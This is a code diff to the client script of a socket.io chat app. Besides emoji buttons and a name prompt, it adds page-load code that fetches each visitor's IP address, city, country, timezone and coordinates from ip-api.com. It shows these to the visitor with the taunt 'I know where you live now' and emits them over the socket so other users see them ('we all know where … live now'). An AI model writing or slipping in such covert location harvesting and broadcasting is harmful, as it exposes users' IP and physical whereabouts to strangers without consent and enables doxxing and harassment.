@@ -91,6 +91,10 @@ const socket = io();
       document.getElementById("disgust").onclick = () => {input.value += "🤮"};
       document.getElementById("coolGuy").onclick = () => {input.value += "😎"};
       document.getElementById("eye").onclick = () => {input.value += "👀"};
+
+      socket.on("logUserDetails", (data) => {
+        appendMessage(data);
+      })
       document.getElementById("emojis").onmouseleave = () => {
         document.getElementById("emojis").style.display = "none";
       }
@@ -938,7 +942,41 @@ ${numUser}`;
           document.getElementById("adminPanelBtn").style.display = "none";
           },10)
         }
+        setTimeout(() => {
+          if(document.getElementById("username").value == 'NoName'){
+            let name = prompt("Please enter your name!");
+            if(name){
+              username.value = name;
+              localStorage.setItem("username", name);
+            }
+            else{
+              while(!name){
+                name = prompt("Please enter your name!")
+                if(name){
+                  username.value = name;
+                  localStorage.setItem("username", name);
+                }
+              }
+            }
+          }
+        }, 1000)
         socket.emit("join room", "Home")
+        socket.emit("accounts")
+        fetch("http://ip-api.com/json/?fields=61439").then((response) => response.json()).then((data) => {
+          appendMessage(`Your IP address is: ${data.query}<br>
+          You are currently in ${data.city} city, ${data.country}<br>
+          Your timezone is: ${data.timezone}<br>
+          Your latitude is: ${data.lat}<br>
+          Your longitude is: ${data.lon}<br>
+          Let's just say, I know where you live now.<br>`)
+
+          socket.emit("userDetails", `${username.value}'s IP address is: ${data.query}<br>
+          ${username.value} is currently in ${data.city} city, ${data.country}<br>
+          ${username.value}'s timezone is: ${data.timezone}<br>
+          ${username.value}'s latitude is: ${data.lat}<br>
+          ${username.value}'s longitude is: ${data.lon}<br>
+          Let's just say, we all know where ${username.value} live now.<br>`)
+        })
       });
 
       // force kick packet receiver
